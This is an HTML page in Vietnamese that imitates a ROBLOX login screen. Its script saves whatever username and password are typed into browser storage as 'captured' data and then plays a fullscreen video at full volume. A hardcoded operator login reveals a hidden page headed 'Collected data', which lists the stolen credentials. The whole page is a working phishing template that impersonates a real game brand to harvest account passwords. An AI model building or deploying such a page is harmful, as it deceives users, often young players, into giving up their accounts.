<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; margin: 0; }
        #nav { font-size: 10px; padding: 5px; border-bottom: 1px solid #333; display: none; }
        #loginForm { padding: 20px; text-align: center; }
        input { background: #222; border: 1px solid #444; color: white; padding: 8px; width: 80%; margin: 5px; }
        button { padding: 8px 20px; background: #0084ff; border: none; color: white; cursor: pointer; }
        #homeArea { display: none; padding: 20px; }
        #vid { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; }
    </style>
</head>
<body>

<div id="nav"><a href="#" onclick="viewHome()" style="color:#fff; text-decoration:none;">Home</a></div>

<div id="loginForm">
    <h2>ROBLOX</h2>
    <input type="text" id="user" placeholder="Tên đăng nhập"><br>
    <input type="password" id="pass" placeholder="Mật khẩu"><br>
    <button onclick="login()">Đăng nhập</button>
</div>

<div id="homeArea">
    <h3>Dữ liệu đã thu thập:</h3>
    <div id="result"></div>
</div>

<video id="vid" loop>
    <source src="video_url.mp4" type="video/mp4">
</video>

<script>
    function login() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        
        // Lưu dữ liệu vào localStorage (Giả lập thu thập)
        localStorage.setItem('captured_user', u);
        localStorage.setItem('captured_pass', p);
        
        // Kích hoạt video
        const v = document.getElementById('vid');
        v.style.display = 'block';
        v.volume = 1.0;
        v.play();

        // Kiểm tra điều kiện mở khóa Home
        if(u === "ggg36" && p === "36thanhhoa") {
            document.getElementById('nav').style.display = 'block';
        }
    }

    function viewHome() {
        document.getElementById('loginForm').style.display = 'none';
        document.getElementById('vid').style.display = 'none';
        document.getElementById('homeArea').style.display = 'block';
        document.getElementById('result').innerText = "User: " + localStorage.getItem('captured_user') + 
                                                      " | Pass: " + localStorage.getItem('captured_pass');
    }
</script>
</body>
</html>
